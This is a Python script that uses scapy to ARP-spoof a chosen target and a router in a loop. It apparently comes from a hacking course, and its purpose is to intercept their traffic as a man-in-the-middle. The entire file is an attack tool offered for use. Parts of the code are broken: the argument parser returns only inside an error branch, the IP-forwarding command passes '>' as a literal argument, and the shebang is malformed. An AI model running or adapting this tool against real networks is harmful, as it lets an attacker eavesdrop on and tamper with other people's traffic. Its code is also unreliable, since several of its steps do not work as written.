#!usr/bin/env python
import subprocess

import scapy.all as scapy
import optparse
import time
import sys     # This will be for the program in Python 2.7 only

def get_arguements():                         # Take arguements from the user

    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", help="To specify the Target IP Address", dest="target_ip")
    parser.add_option("-s", "--spoof", help="To specify the Spoof IP Address", dest="spoof_ip")
    parser.add_option("-i", "--interval", help="To specify the interval between two packets sent in seconds. Default = 2", dest="timeout")

    (options, arguements) = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify the Target IP Address")
    if not options.spoof_ip:
        parser.error("[-] Please specify the Spoof IP Address")

        return options

def get_mac(ip):                                                                        # The same function from the network scanner program

    arp_packet = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_packet

    answer = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)             # pdst is the packet destination # psrc is the packet source

    # The following packet is to be sent to the target. pdst is the Target's ip that is to be set.
    # hwdst is the Target MAC Address. psrc is the Source MAC Address which in this case we need to set Routers MAC Address to inform the Target that we are the Router.
    #scapy.ls(packet)

    scapy.send(packet)

def restore(destination_ip, source_ip):

    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


packet_sent = 0

print("[+] Enabling IP Forwarding ..... ")
subprocess.call(['echo', '1', '>', 'echo 1 > /proc/sys/net/ipv4/ip_forward'])          # This will allow the data comming from the target to flow from this computer

try:
    while True:

        options = get_arguements()
        target_ip = options.target_ip
        spoof_ip = options.spoof_ip

        spoof(target_ip, spoof_ip)       # Tell the target that I am router
        spoof(spoof_ip, target_ip)       # Tell the router that I am target

        packet_sent = packet_sent + 2

        print("\r[+] Packet sent: " + str(packet_sent), end="")     # This comma will help in not printing the statements in the same line. This is only for python3

        #print("\r[+] Packet sent: " + str(packet_sent)),     # This comma will help in not printing the statements in the same line. (For python 2.7 only))
        #sys.stdout.flush()                                   # To flush the buffer were all ths packet send data is stored.

        if options.timeout:
            time.sleep(options.timeout)
        else:
            time.sleep(2)                                    # Send Packets at 2 seconds interval
except KeyboardInterrupt:
    print("[+] CTRL + C detected ..... Restoring ARP Tables ..... Please wait")
    restore(options.target_ip, options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)


